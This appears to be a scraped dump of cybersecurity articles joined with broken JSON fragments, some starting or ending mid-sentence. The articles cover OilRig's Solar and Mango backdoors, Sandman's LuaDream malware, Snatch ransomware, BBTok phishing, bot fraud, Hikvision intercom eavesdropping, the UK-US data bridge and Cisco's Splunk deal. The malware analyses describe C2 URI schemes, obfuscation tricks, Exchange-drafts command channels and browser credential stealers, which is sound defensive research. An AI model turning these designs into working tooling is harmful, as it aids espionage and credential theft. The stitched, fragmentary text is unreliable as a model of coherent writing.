difficult.The attacker also included multiple security validation and anti-analysis techniques to make sure that only potential victims reach the next stage of the scam, which shows a fake Booking.com payment page.Despite the more sophisticated approach that makes the trick very difficult to spot, Guez says that the regular signs indicating a potential scam could still reveal the fraud.Users should avoid clicking on unsolicited links, even if they look legitimate, be suspicious of urgent or threatening messages asking for immediate action, and check URLs for indicators of deception.However, to ensure you don’t fall victim to more complex phishing campaigns, the recommended action is to contact the company directly at an official email address or phone number and ask for clarifications about the message."

Both of these cyberespionage campaigns targeted Israeli organizations exclusively, which is in line with the group’s focus on the Middle East, and used the same playbook: OilRig first compromised a legitimate website to use as a C&C server and then used VBS droppers to deliver a C#/.NET backdoor to its victims, while also deploying a variety of post-compromise tools mostly used for data exfiltration on the target systems.In their Outer Space campaign, OilRig used a simple, previously undocumented C#/.NET backdoor we named Solar, along with a new downloader, SampleCheck5000 (or SC5k), that uses the Microsoft Office Exchange Web Services API for C&C communication. For the Juicy Mix campaign, the threat actors improved on Solar to create the Mango backdoor, which possesses additional capabilities and obfuscation methods. In addition to detecting the malicious toolset, we also notified the Israeli CERT about the compromised websites.Key points of this blogpost:In this blogpost, we provide technical analysis of the Solar and Mango backdoors, of the VBS dropper used to deliver Mango, and of the post-compromise tools deployed in each campaign.Besides the overlap in tools and targeting, we also saw multiple similarities between the Solar backdoor and the backdoors used in Out to Sea, mostly related to upload and download: both Solar and Shark, another OilRig backdoor, use URIs with simple upload and download schemes to communicate with the C&C server, with a “d” for download and a “u” for upload; additionally, the downloader SC5k uses uploads and downloads subdirectories just like other OilRig backdoors, namely ALMA, Shark, DanBot, and Milan. These findings serve as a further confirmation that the culprit behind Outer Space is indeed OilRig.As for the Juicy Mix campaign’s ties to OilRig, besides targeting Israeli organizations – which is typical for this espionage group – there are code similarities between Mango, the backdoor used in this campaign, and Solar. Moreover, both backdoors were deployed by VBS droppers with the same string obfuscation technique. The choice of post-compromise tools employed in Juicy Mix also mirrors previous OilRig campaigns.Named for the use of an astronomy-based naming scheme in its function names and tasks, Outer Space is an OilRig campaign from 2021. In this campaign, the group compromised an Israeli human resources site and subsequently used it as a C&C server for its previously undocumented C#/.NET backdoor, Solar. Solar is a simple backdoor with basic functionality such as reading and writing from disk, and gathering information.Through Solar, the group then deployed a new downloader SC5k, which uses the Office Exchange Web Services API to download additional tools for execution, as shown in Figure 1. In order to exfiltrate browser data from the victim’s system, OilRig used a Chrome-data dumper called MKG.In 2022 OilRig launched another campaign targeting Israeli organizations, this time with an updated toolset. We named the campaign Juicy Mix for the use of a new OilRig backdoor, Mango (based on its internal assembly name, and its filename, Mango.exe). In this campaign, the threat actors compromised a legitimate Israeli job portal website for use in C&C communications. The group’s malicious tools were then deployed against a healthcare organization, also based in Israel.The Mango first-stage backdoor is a successor to Solar, also written in C#/.NET, with notable changes that include exfiltration capabilities, use of native APIs, and added detection evasion code.Along with Mango, we also detected two previously undocumented browser-data dumpers used to steal cookies, browsing history, and credentials from the Chrome and Edge browsers, and a Windows Credential Manager stealer, all of which we attribute to OilRig. These tools were all used against the same target as Mango, as well as at other compromised Israeli organizations throughout 2021 and 2022. Figure 2 shows an overview of how the various components were used in the Juicy Mix campaign.In this section, we provide a technical analysis of the Solar and Mango backdoors and the SC5k downloader, as well as other tools that were deployed to the targeted systems in these campaigns.To establish a foothold on the target’s system, Visual Basic Script (VBS) droppers were used in both campaigns, which were very likely spread by spearphishing emails. Our analysis below focuses on the VBS script used to drop Mango (SHA-1: 3699B67BF4E381847BF98528F8CE2B966231F01A); note that Solar’s dropper is very similar.The dropper’s purpose is to deliver the embedded Mango backdoor, schedule a task for persistence, and register the compromise with the C&C server. The embedded backdoor is stored as a series of base64 substrings, which are concatenated and base64 decoded. As shown in Figure 3, the script also uses a simple string deobfuscation technique, where strings are assembled using arithmetic operations and the Chr function.On top of that, Mango’s VBS dropper adds another type of string obfuscation and code to set up persistence and register with the C&C server. As shown in Figure 4, to deobfuscate some strings, the script replaces any characters in the set #*+-_)(}{@$%^& with 0, then divides the string into three-digit numbers that are then converted into ASCII characters using the Chr function. For example, the string 116110101109117+99111$68+77{79$68}46-50108109120115}77 translates to Msxml2.DOMDocument.Once the backdoor is embedded on the system, the dropper moves on to create a scheduled task that executes Mango (or Solar, in the other version) every 14 minutes. Finally, the script sends a base64-encoded name of the compromised computer via a POST request to register the backdoor with its C&C server.Solar is the backdoor used in OilRig’s Outer Space campaign. Possessing basic functionalities, this backdoor can be used to, among other things, download and execute files, and automatically exfiltrate staged files.We chose the name Solar based on the filename used by OilRig, Solar.exe. It is a fitting name since the backdoor uses an astronomy naming scheme for its function names and tasks used throughout the binary (Mercury, Venus, Mars, Earth, and Jupiter).Solar begins execution by performing the steps shown in Figure 5.The backdoor creates two tasks, Earth and Venus, that run in memory. There is no stop function for either of the two tasks, so they will run indefinitely. Earth is scheduled to run every 30 seconds and Venus is set to run every 40 seconds.Earth is the primary task, responsible for the bulk of Solar’s functions. It communicates with the C&C server using the function MercuryToSun, which sends basic system and malware version information to the C&C server and then handles the server’s response. Earth sends the following info to the C&C server:Encryption and decryption are implemented in functions named JupiterE and JupiterD, respectively. Both of them call a function named JupiterX, which implements an XOR loop as shown in Figure 6.An Israeli human resources company’s web server, which OilRig compromised at some point before deploying Solar, was used as the C&C server:http://organization.co[.]il/project/templates/office/template.aspx?rt=d&sun=<encrypted_MachineGuid>&rn=<encryption_nonce>Prior to being appended to the URI, the encryption nonce is encrypted, and the value of the initial query string, rt, is set to d here, likely for “download”.The last step of the MercuryToSun function is to process a response from the C&C server. It does so by retrieving a substring of the response, which is found between the characters QQ@ and @kk. This response is a string of instructions separated by asterisks (*) that is processed into an array. Earth then carries out the backdoor commands, which include downloading additional payloads from the server, listing files on the victim’s system, and running specific executables.Command output is then gzip compressed using the function Neptune and encrypted with the same encryption key and a new nonce. Then the results are uploaded to the C&C server, thus:http://organization.co[.]il/project/templates/office/template.aspx?rt=u&sun=<MachineGuid>&rn=<new_nonce>MachineGuid and the new nonce are encrypted with the JupiterE function, and here the value of rt is set to u, likely for “upload”.Venus, the other scheduled task, is used for automated data exfiltration. This small task copies the content of files from a directory (also named Venus) to the C&C server. These files are likely dropped here by some other, as yet unidentified, OilRig tool. After uploading a file, the task deletes it from disk.For its Juicy Mix campaign, OilRig switched from the Solar backdoor to Mango. It has a similar workflow to Solar and overlapping capabilities, but there are nevertheless several notable changes:Contrary to Solar’s astronomy-themed naming scheme, Mango obfuscates its symbol names, as can be seen in Figure 7. Besides the symbol name obfuscation, Mango also uses the string stacking method (as shown in Figure 8) to obfuscate strings, which complicates the use of simple detection methods. Similar to Solar, the Mango backdoor starts by creating an in-memory task, scheduled to run indefinitely every 32 seconds. This task communicates with the C&C server and executes backdoor commands, similar to Solar’s Earth task. While Solar also creates Venus, a task for automated exfiltration, this functionality has been replaced in Mango by a new backdoor command.In the main task, Mango first generates a victim identifier, <victimID>, to be used in C&C communications. The ID is computed as an MD5 hash of <machine name><username>, formatted as a hexadecimal string.To request a backdoor command, Mango then sends the string d@<victimID>@<machine name>|<username> to the C&C server http://www.darush.co[.]il/ads.asp – a legitimate Israeli job portal, likely compromised by OilRig before this campaign. We notified the Israeli national CERT organization about the compromise.The request body is constructed as follows:To communicate with its C&C server, Mango uses the TLS (Transport Layer Security) protocol, which is used to provide an additional layer of encryption.Similarly, the backdoor command received from the C&C server is XOR encrypted, base64 encoded, and then enclosed between [@ and @] within the HTTP response body. The command itself is either NCNT (in which case no action is taken), or a string of several parameters delimited by @, as detailed in Table 1, which lists Mango’s backdoor commands. Note that <Arg0> is not listed in the table, but is used in the response to the C&C server.Table 1.

Finally, that string is sent to the C&C server using the same protocol and encryption method as described above.This technique’s goal is to block endpoint security solutions from loading their user-mode code hooks via a DLL in this process. While the parameter was not used in the sample we analyzed, it could be activated in future versions.Unrelated to the Juicy Mix campaign, in July 2023 we found a new version of the Mango backdoor (SHA-1: C9D18D01E1EC96BE952A9D7BD78F6BBB4DD2AA2A), uploaded to VirusTotal by several users under the name Menorah.exe. The internal version in this sample was changed from 1.0.0 to 1.1.1, but the only notable change is the use of a different C&C server, http://tecforsc-001-site1.gtempurl[.]com/ads.asp.Along with this version, we also discovered a Microsoft Word document (SHA-1: 3D71D782B95F13EE69E96BCF73EE279A00EAE5DB) with a malicious macro that drops the backdoor. Figure 10 shows the fake warning message, enticing the user to enable macros for the document, and the decoy content that is displayed afterwards, while the malicious code is running in the background.Figure 10. Microsoft Word document with a malicious macro that drops Mango v1.1.1In this section, we review a selection of post-compromise tools used in OilRig’s Outer Space and Juicy Mix campaigns, aimed at downloading and executing additional payloads, and stealing data from the compromised systems.SampleCheck5000 (or SC5k) is a downloader used to download and execute additional OilRig tools, notable for using the Microsoft Office Exchange Web Services API for C&C communication: the attackers create draft messages in this email account and hide the backdoor commands in there. Subsequently, the downloader logs into the same account, and parses the drafts to retrieve commands and payloads to execute.SC5k uses predefined values – Microsoft Exchange URL, email address, and password – to log into the remote Exchange server, but it also supports the option to override these values using a configuration file in the current working directory named setting.key. We chose the name SampleCheck5000 based on one of the email addresses that the tool used in the Outer Space campaign.Once SC5k logs into the remote Exchange server, it retrieves all the emails in the Drafts directory, sorts them by most recent, keeping only the drafts that have attachments. It then iterates over every draft message with an attachment, looking for JSON attachments that contain \"data\" in the body. It extracts the value from the key data in the JSON file, base64 decodes and decrypts the value, and calls cmd.exe to execute the resulting command line string. SC5k then saves the output of the cmd.exe execution to a local variable.As the next step in the loop, the downloader reports the results to the OilRig operators by creating a new email message on the Exchange server and saving it as a draft (not sending), as shown in Figure 11. A similar technique is used to exfiltrate files from a local staging folder. As the last step in the loop, SC5k also logs the command output in an encrypted and compressed format on disk.It is characteristic of OilRig operators to use browser-data dumpers in their post-compromise activities. We discovered two new browser-data stealers among the post-compromise tools deployed in the Juicy Mix campaign alongside the Mango backdoor. They dump the stolen browser data in the %TEMP% directory into files named Cupdate and Eupdate (hence our names for them: CDumper and EDumper).Both tools are C#/.NET browser-data stealers, collecting cookies, browsing history, and credentials from the Chrome (CDumper) and Edge (EDumper) browsers. We focus our analysis on CDumper, since both stealers are practically identical, save for some constants.When executed, CDumper creates a list of users with Google Chrome installed. On execution, the stealer connects to the Chrome SQLite Cookies, History and Login Data databases under %APPDATA%\\Local\\Google\\Chrome\\User Data, and collects browser data including visited URLs and saved logins, using SQL queries.The cookie values are then decrypted, and all collected information is added to a log file named C:\\Users\\<user>\\AppData\\Local\\Temp\\Cupdate, in cleartext. This functionality is implemented in CDumper functions named CookieGrab (see Figure 12),  HistoryGrab, and PasswordGrab. Note that there is no exfiltration mechanism implemented in CDumper, but Mango can exfiltrate selected files via a backdoor command.Besides browser-data dumping tools, OilRig also used a Windows Credential Manager stealer in the Juicy Mix campaign. This tool steals credentials from Windows Credential Manager, and similar to CDumper and EDumper, stores them in the %TEMP% directory – this time into a file named IUpdate (hence the name IDumper). Unlike CDumper and EDumper, IDumper is implemented as a PowerShell script.OilRig continues to innovate and create new implants with backdoor-like capabilities while finding new ways to execute commands on remote systems. The group improved upon its C#/.NET Solar backdoor from the Outer Space campaign to create a new backdoor named Mango for the Juicy Mix campaign. The group deploys a set of custom post-compromise tools that are used to collect credentials, cookies, and browsing history from major browsers and from the Windows Credential Manager. Despite these innovations, OilRig also continues to rely on established ways to obtain user data.SHA-1FilenameESET detection

      "title": "Sandman APT | A Mystery Group Targeting Telcos with a LuaJIT Toolkit - SentinelOne",
      "text": " By Aleksandar Milenkoski, in collaboration with QGroupThe activities we observed are characterized by strategic lateral movement to specific targeted workstations and minimal engagement, suggesting a deliberate approach aimed at achieving the set objectives while minimizing the risk of detection.The implementation and architecture of LuaDream suggest a maintained, versioned project under active development. This is a modular, multi-protocol backdoor whose main functionalities are:Although the intrusions were detected and interrupted before the threat actor could deploy plugins, our analysis of LuaDream staging samples shared on VirusTotal provided a glimpse into what functionalities the plugins may implement, with command execution capabilities being one example.The 36 distinct LuaDream components we identified and the support for multiple protocols for C2 communication indicate a project of a considerable scale. The LuaDream staging chain is designed to evade detection and thwart analysis while deploying the malware directly into memory. LuaDream’s implementation and staging process leverage the LuaJIT platform, the just-in-time compiler for the Lua scripting language. This is primarily to make malicious Lua script code difficult to detect.Based on current visibility, accurate clustering remains a challenge. The focussed, strategy-driven activities, and the use of complex malware designed to evade detection point to a motivated and capable adversary. The TTPs, victimology, and the characteristics of the deployed malware indicate that it is highly likely this activity has espionage motivations. Communication providers are frequent targets of espionage activity due to the sensitive data they hold.The activity cluster we observed and examination of C2 netflow data indicate a pronounced focus on targeting telecommunications providers with a broad geographical distribution, including the Middle East, Western Europe, and the South Asian subcontinent.Compilation timestamps and a string artifact found within LuaDream hint at potential malware development efforts over the first half of 2022, suggesting possible threat actor activity dating back to 2022.While we cannot associate LuaDream to any known threat actor, we lean towards the possibility of a private contractor or mercenary group. Typically used as a scripting middleware in gaming and specialty embedded applications and appliances, the use of LuaJIT in the context of APT malware is relatively rare but the population using it is becoming broader. Embedded Lua VMs serve as a mechanism for modularity and extensibility for advanced APTs, historically considered Western or Western-aligned. However, this development paradigm is being embraced by a broader set of threat actors that also target Western countries and deserves further scrutiny as exemplified by the Sandman APT. Our talk at LABScon 2023 described this paradigm of development overtime, bookended by our discovery of Sandman APT as the latest, along with Fast16 as the earliest example dating back to 2005.In March 2023, new malware was briefly described by Kaspersky during a quarterly roundup actively targeting a government entity in Pakistan. Based on the sparsely described characteristics, we assess that they’re referring to a variant of LuaDream –dubbed DreamLand. Note the following string in the LuaDream samples we identified:The activities we observed took place over several weeks in August 2023. After stealing administrative credentials and conducting reconnaissance, Sandman infiltrated specifically targeted workstations using the pass-the-hash technique over the NTLM authentication protocol. On one of the targets, all of the workstations were assigned to personnel in managerial positions.On average, we observed a five-day gap between infiltrations into different endpoints. After gaining access, Sandman limited its activities to deploying folders and files required for loading and executing LuaDream, refraining from any further actions. We observerd the following deployed filesystem artifacts:It is relevant to note that we did not observe the threat actor restarting the Fax and or Spooler service to force the execution of LuaDream, likely to evade detection based on service manipulation. Instead, they were patient in waiting for one of these services to load the malicious ualapi.dll when started at the next system boot.The LuaDream staging process is intricate and designed with a focus on evading detection and thwarting analysis. Initiated by the Fax or the Spooler service, which would execute the UalStart export of the malicious ualapi.dll when started, the overall process consists of seven main stages. These are conducted fully in memory and involve a combination of fully-formed DLL PE images, code, and LuaJIT bytecode.The following table shows DLL images involved in LuaDream staging:Although the DLL timestamps could have been manipulated by the threat actor, given the proximity to the August 2023 intrusion date, it is likely that the timestamps are authentic. Due to the difference of only a few days between the timestamps of ualapi.dll and common.dll, and their actual deployment dates, it is possible that these images have been built specifically for this intrusion.Some of the implemented anti-analysis measures include hiding LuaDream’s threads from a debugger using the NtSetInformationThread function, file close operation on an invalid handle (0x123456), detection of Wine-based sandboxes, and in-memory mapping of malicious PE images to evade EDR API hooks and file-based detections.Next-stage code is typically packed using a combination of XOR-based encryption and compression. The fax.dat, fax.Application, and fax.module files store packed staging code. The code unpacked from fax.Application contains a LuaJIT engine enabling the execution of the LuaJIT components internally referred to as interface and crt as well as LuaDream itself.interface unpacks crt from fax.module, which in turn retrieves XML-formatted configuration and the contents of the fax.cache file – an encrypted and compressed Lua function, which returns the reference names and implementations of LuaDream components in Base-64 encoded form.The LuaDream configuration includes C2 and communication protocol information. The LuaDream variant we analyzed is configured to communicate with the mode.encagil[.]com domain over the WebSocket protocol.LuaDream is a multi-component and multi-protocol backdoor, whose main features are managing attacker-provided plugins and exfiltrating system and user information. The implementation and architecture of LuaDream indicates that it is a maintained, actively developed project of a considerable scale.Throughout our analysis, we observed what is likely a malware version string (12.0.2.5.23.29), which the backdoor sends to the C2 server when exfiltrating information. Many LuaDream function and variable definitions follow a naming convention involving the word fun, such as dofun,  _RUN_FUN_LIST_, and FunGetDataCache.LuaDream implements testing functions as well as error and execution status logging, which indicates that the malware is likely still in active development. A string artifact in a function labeled com_TestJson suggests potential development in June 2022.\n\nTesting functions (decompiled LuaJIT bytecode)We observed the embedded private IP address 10.2.101[.]99 to which LuaDream binds the communication port 4443, if so configured. This address does not belong to the IP address spaces of the targeted environments. The IP address may be a leftover from an in-development LuaDream variant or from a previous Sandman engagement.The core components implement LuaDream features, such as initialization, gathering system and user information, C2 communication, and plugin management. As per the component definitions from the fax.cache file, the core LuaDream components are structured into two categories: .com and .main.With the main component initializing LuaDream, the backdoor connects to the configured C2 server and exfiltrates system, user, and malware-related information gathered by BGetSystemMsg. This information includes the malware version, assigned IP and MAC addresses, OS version, available memory, and the name, PID, and username associated with the process in whose context LuaDream runs.LuaDream has the capability to reach out to C2 servers but also to act as an implant listening for incoming connections. The backdoor can communicate over the TCP, HTTPS, WebSocket, and QUIC protocols. The main_proto_X_TcpClient, main_proto_WinHttpClient, main_proto_X_WebSocketClient, and main_proto_X_QuicClient components implement support for these protocols, with main_z_protoInterface acting as their main handler.The main_proto_A_QueryDns component resolves domains to IP addresses using the cloudflare-dns[.]com service, which main_proto_X_WebSocketClient uses for resolving C2 domain names.main_proto_X_QuicClient draws functionalities from a DLL image which LuaDream maps fully in memory, a functionality implemented by the Acom_LoadDLL component.LuaDream communicates with a C2 server using the thread_connect, thread_send, and thread_recv components, which are responsible for connecting to, sending data to, and receiving data from the C2 server, respectively. These components operate in separate threads. The exchanged data is in JSON and XML format, in an encrypted and compressed form. The Acom_define component provides functionalities for inter-thread communication and data manipulation.The thread_recv component handles incoming messages and its main purpose is to manage attacker-provided plugins that extend LuaDream. Some functionalities of this component include:LuaDream maintains a key-based list of plugin information, which includes the handle and the ID of the thread in which the plugin runs, and a plugin-identifying key. Loading of a plugin involves inserting a new entry in this list and executing plugin code in a designated thread. For communicating with plugins, LuaDream leverages inter-thread communication, using the message 1234 for executing plugin functionalities.Our analysis of LuaDream staging samples shared on VirusTotal revealed the existence of two additional components named main_proto_WinHttpServer and thread_test. main_proto_WinHttpServer implements a LuaDream capability to listen for incoming connections based on the Windows HTTP server API. thread_test implements functions for testing the loadplugin and saveplugin commands. These functions indicate the existence of a plugin named cmd, whose name suggests command execution capabilities.The LuaDream samples we analyzed communicate with the C2 servers ssl.explorecell[.]com and mode.encagil[.]com. ssl.explorecell[.]com is a Tucows-registered domain with a first-seen resolution date of March 2023. This domain last resolved to 185.82.218[.]230, an IP address of a server hosted in Bulgaria by the ITLDC hosting provider.mode.encagil[.]com is an Arsys-registered domain with a first-seen resolution date of August 2023. The domain last resolved to 172.67.173[.]208 and 104.21.47[.]226, IP addresses of a server hosted behind a major load balancing platform. The shift from using a directly exposed C2 server IP address to addresses of a load balancing infrastructure marks a change in Sandman’s infrastructure management practices – likely to avoid exposing the true hosting location.Examination of C2 netflow data revealed lack of comprehensive C2 infrastructure segmentation, with several LuaDream deployments at geographically dispersed victim environments communicating with the same C2 server.Navigating the shadows of the threat landscape necessitates consistent cooperation and information sharing within the threat intelligence research community.

      "text": " UK / EMEA News Reporter, Infosecurity MagazineAuthorities in the US released a new cybersecurity advisory yesterday updating organizations on the latest tactics, techniques and procedures (TTPs) used by the Snatch ransomware-as-a-service (RaaS) group.Although it first appeared in 2018, Snatch has been in continuous development since 2021, borrowing techniques off other operations, the Cybersecurity and Infrastructure Security Agency (CISA) and FBI explained.It uses a classic double extortion playbook, with victim details being posted to a leak site if they fail to pay up.“Snatch threat actors have been observed purchasing previously stolen data from other ransomware variants in an attempt to further exploit victims into paying a ransom to avoid having their data released on Snatch’s extortion blog,” the advisory continued.The group typically attempts to brute force RDP endpoints or use credentials purchased on the dark web for initial access, gaining persistence by compromising an administrator account and establishing connections over port 443 to a command-and-control server hosted by a Russian bulletproof hosting service.Affiliates use tools such as Metasploit and Cobalt Strike for lateral movement and data discovery, sometimes spending up to three months inside a victim network, the advisory added.They often also attempt to disable antivirus in a rather idiosyncratic way.Victim organizations hail from a variety of critical infrastructure sectors, including the Defense Industrial Base (DIB) and food and agriculture, as well as tech.“There has been increased activity by the Snatch ransomware group over the past 12-18 months as they have claimed responsibility for several recent high-profile attacks including ones involving South Africa’s Department of Defense, the California city of Modesto, Canada’s Saskatchewan airport, London-based organization Briars Group and others,” he said.“Between July 2022 and June 2023, we tracked 70 attacks by Snatch across all verticals. Overwhelmingly, those attacks were focused on North America,” he added."

      "title": "\r\n\tUK-US Confirm Agreement for Personal Data Transfers - Infosecurity Magazine\r\n",
      "text": " Deputy Editor, Infosecurity MagazineThe UK government has announced its decision to establish a data bridge with the US, enabling the free flow of personal data between the two regions.Adequacy regulations have been laid out in the UK Parliament on September 21, 2023, to give effect to this decision, with the regulations due to come into force from October 12.This means that from October 12, UK businesses can transfer personal data to the US without alternative mechanisms, and without completing transfer impact assessments and implementing additional transfer safeguards. The Data Privacy Framework replaces the previous Privacy Shield arrangement between the EU and US, which was ruled unlawful under the GDPR due to concerns that US law enforcement agencies could access personal data transferred to the US.Both the US and UK government have argued that the data bridge will unlock economic opportunities for businesses as well as facilitating innovation in areas like science and research.Speaking to Infosecurity, Ieuan Jolly, partner and chair of Linklaters’ US TMT & Data Solutions Practice, based in New York, welcomed the announcement, stating it provides legal certainty for businesses on both sides of the Atlantic, in addition to fostering stronger ties between the two countries.“The deal provides a level of legal certainty that businesses have been yearning for. With clear guidelines and safeguards for the cross-border transfer of personal data, it will enable companies to plan and operate with more confidence. This newfound certainty is particularly vital for industries reliant on data-driven strategies, such as technology, e-commerce and financial services,” commented Jolly.He argued that the deal will enable businesses operating in the UK and US to navigate data privacy issues more seamlessly.Jolly advised these businesses to proactively review their data protection practices and update their agreements and procedures to align with the new rules.“Conducting thorough risk assessments and ensuring compliance with the requirements of the agreement will be crucial steps for companies operating in both jurisdictions,” he added.Georgina Graham, privacy and technology partner, Osborne Clarke, said UK businesses should take steps to understand the extent to which their arrangements with US businesses could benefit from the new UK-US data bridge.“This means checking whether those US businesses participate (or intend to participate) in the UK-US data bridge, checking the US businesses privacy policy (included within their Data Privacy Framework record) and checking whether the types of data they are transferring are covered by it,” she advised.Peter Church, Counsel in Linklaters’ Global Tech Sector, based in London, warned that current legal challenges to the EU-US Data Privacy Framework are already underway, and “the fate of the UK extension is closely tied to the outcome of any challenge in the EU.”Nevertheless, Church believes the significant enhancements made to US privacy laws by EO 14086 means that any legal challenge will likely struggle.Edward Machin, a senior lawyer in Ropes & Gray’s Data, Privacy and Cybersecurity team, noted that the deal forms part of UK’s post-Brexit policy of liberalizing its data protection regime without straying too far from the GDPR. He believes the fact the data bridge mirrors the Data Privacy Framework “will help to assuage European concerns.”However, Machin said that “the UK’s data transfer deals with other countries will continue to be subject to scrutiny both at home and abroad.”He added that it will be interesting to observe whether privacy interest groups in the UK mount their own challenge to the UK Extension."

In some cases, people even go so far as to enter their payment card number directly into the malicious interfaces, the researchers added.In fact, during its research, Check Point discovered a database of some BBTok malware victims in Mexico that included more than 150 entries with victims' information, confirming the success of the operation, which remains active.The recent findings regarding the latest BBTok variant and campaign expose once again how threat actors are constantly evolving threat tactics to steal banking and other credentials for financial gain, calling on users to be more sophisticated in their vigilance as well.Key ways that people can do this so as not to fall victim to scams include to always be suspicious of password-reset emails, visiting websites directly rather than clicking on embedded links if prompted by a banking site to reset their password.Check Point also reiterated some common ways that malicious actors try to convince people to share credentials, including lookalike sites like the ones used in the latest BBTok campaign, and scams in which attackers impersonate customer-support specialists from known companies like Microsoft or Apple. The researchers advised that people never share credentials with anyone outside of logging in directly to the websites that require them.Finally, people should be aware of common social-engineering language used specifically to get people to ignore initial suspicions about a phishing email and go on to click a link or open an attachment against their better judgment.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " UK / EMEA News Reporter, Infosecurity MagazineThe typical business in the US and UK loses over 4% of their online revenue every year due to malicious bot attacks, according to a new report from Netacea.The firm’s Death by a Billion Bots report was compiled from a survey of 440 businesses with an average online revenue of $1.9bn across the travel, entertainment, e-commerce, financial services and telecoms sectors in the US and the UK.It found that the average firm loses $85.6m annually to bot attacks, up from $33.3m per business in 2020. Netacea argued that this is far greater than the average ransom payment or GDPR fine.Most (53%) attacks came from Russia or China, with nearly half (48%) of respondents also seeing attacks from endpoints in Vietnam, although the source of these threats may be actors in other countries.The majority (65%) were targeted at mobile devices, followed by websites (63%) and APIs (40%).The threat appears to be getting worse: 99% of companies that detected an automated attack said they had seen an increase in attack volumes, with 13% claiming the increase was “significant.”Attacks are varied. The most common, observed by half (49%) of respondents, were from sniper bots, which monitor time-based activity and submit information at the very last moment, such as on online auction sites. These can be particularly damaging to dynamic pricing environments in financial services, Netacea claimed.Also common were account checker attacks (45%), scraper bots (33%), gift card crackers (30%) and scalper bots (29%).Such attacks can have a major impact not only on the bottom line but also reputation, with 88% claiming bots have impacted customers satisfaction.“The cumulative effect of these attacks is wiping tens of millions of dollars in value from online businesses, not to mention the effect on their reputations and operations, yet this activity is low key enough to remain undetected for months,” warned Netacea co-founder, Andy Still.“With the fastest growth seen in countries where there is little chance of law enforcement, businesses can only expect these attacks to increase in number.”"

      "text": " A concerning Internet of Things cyberattack vector has been uncovered — one that can turn the neighboring devices of a Hikvision smart intercom into spying devices. Hikvision devices were specifically chosen for this research because they're readily available and because the brand is popular. Researchers tested on two intercom products, DS-KH6210-L and DS-KH6320-WTE1; among other things, they tested the devices inside an apartment to observe how they would interact with other devices found in a normal complex, such as door controllers, cameras, and other intercoms. Port mirroring was configured within the device to allow the researchers \"to capture all traffic entering and leaving the device.\"\"An attacker would need network access to deploy this attack, and given that these systems are generally not connected to the Internet, this means physical access to the target building,\" says Adi Ashkenazy, CEO at Skylight Cyber. \"Once you have physical access, you need to connect to an Ethernet port, which can be done through either an apartment in the building or the lobby.\"He adds, \"In terms of equipment, you just need an Ethernet cable and a laptop, and we'd throw in a screwdriver for good measure. The overall level of expertise required to deploy the attack is quite low.\"In a situation in which an apartment building or office uses Hikvision devices, specifically its intercoms, and someone has an interest on spying — eavesdropping — on a tenant, the attacker would need to unplug the intercom's Ethernet cable from the wall and instead plug the device into a laptop, using a regular Ethernet cable. At this point, the individual would have the necessary network access to begin this covert breach. Then, \"you run a script that's available on our GitHub to brute-force the admin password of any target device in the network (your neighbors' intercoms),\" Ashkenazy says. \"Once you have the admin password, you log in to the target intercom device and break out of the protected shell, in one of several ways [covered in the research].\" By running a single command from a laptop, an individual can gain complete access to a device and can use any of its functions, including the microphone.Should an attacker with a cable, laptop, and screwdriver on hand manage to brute-force a path to an admin password and break the protected shell, securing unrestricted access, the worst-case scenario is that they would be able to open the microphone on the device. \"Once you have [that] level of access, you can eavesdrop on anyone else in the building that has an intercom,\" Ashkenazy adds.\"Hikvision [was] quite quick to respond, so hats off to them on that. However, as far as we know, they have been selective in terms of the fix, focusing on the authentication bypass, and leaving the shell escape in place,\" according to Skylight Cyber. Furthermore, a potential tenant wouldn't be able to mitigate and patch themselves because of their lack of access to the admin password, so patching is serviced by technicians and the process is manual, meaning that these updates are not applied as often as necessary. So it's a good bet that many individuals and businesses will continue to remain exposed.\"We believe that this might be exploited in the wild until this is patched to a significant extent, which is why we didn't release the full exploitation kit,\" the researchers add.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Adding Splunk could significantly boost Cisco's already formidable cybersecurity protection portfolio. \"Our combined capabilities will create an end-to-end data platform to enhance digital resiliency,\" said Cisco chairman and CEO Chuck Robbins during an investor call to announce the deal. Robbins anticipates the deal will close in the third quarter of 2024, pending shareholder and regulatory approvals.Although regulators worldwide have more intensely scrutinized and often nixed many large deals recently, Robbins is confident they will clear this deal. Emboldening his confidence is that the agreement doesn't have to be approved in China because Splunk has a minimal presence there.While getting large deals approved by regulators in the US and Europe has also become more difficult, Robbins argued that there's little overlap between the two companies' offerings.\"Through the integration of Cisco's extended detection and response platform, our best security insights, and Splunk security information and event management offering, we will be able to help our customers move from threat detection and response to threat prediction and prevention,\" Robbins said.There was little recent indication that Cisco was contemplating a deal with Splunk, which mande the announcement a surprise to industry watchers. In a LinkedIn post, Omdia managing principal analyst Eric Parizo called the Cisco-Splunk deal \"a true bombshell move that will have a seismic impact on the entire enterprise cybersecurity landscape,\" adding it may foreshadow more consolidation.Forrester analyst Allie Mellen agrees the deal could be a significant boon for Cisco's security efforts, but the effect on security practitioners remains to be seen. Mellen warns that Cisco has a checkered past with some of its largest acquisitions.\"Cisco has long been a case study for acquisitions that don't live up to their initial promise and suffer from underinvestment and a lack of focus,\" Mellen says. \"To keep Splunk's massive, loyal user base, Cisco needs to let Splunk deliver what Splunk does best: a flexible, powerful SIEM and observability offering.\"The deal comes amid a growing spotlight on next-generation SIEM and organizations needing to move from legacy platforms to those that support multicloud and cloud-native applications and infrastructure. It also comes as platform providers are expanding their XDR capabilities.Over time, CrowdStrike CEO George Kurtz asserted SIEM will be subsumed into XDR. \"XDR, in my opinion, will replace SIEM; call it next-gen SIEM,\" Kurtz said during a media briefing this week. \"[Customers] want the ability to ingest data at scale ... to store that data, [and] they want the ability to search that data and query it,\" he said. \"And they want the ability to take an action, and if we put it all in one spot.\"Analysts say CrowdStrike's goals are ambitious. \"LogScale is a first step toward SIEM, but is essentially more of a proprietary log management system tailored for its own solutions,\" Parizo notes. \"But if it has the bandwidth and appetite to quickly catch up on SIEM, there are certainly viable acquisition targets out there.\"Mellen notes that most XDR vendors have shifted to having a SIEM or a SIEM-alternative in their portfolio. \"This is a massive shift in the market that gives CrowdStrike and other XDR vendors an opportunity to use to their advantage,\" she says.Cisco's acquisition of Splunk would give Cisco \"both sides of the coin: XDR with Cisco XDR, and a SIEM with Splunk,\" she adds.Roger Thornton, general partner at VC firm Ballistic Ventures, believes that in the short term, customers may become more open to alternative SIEM offerings. \"Customers, particularly big ones, don't like it when their 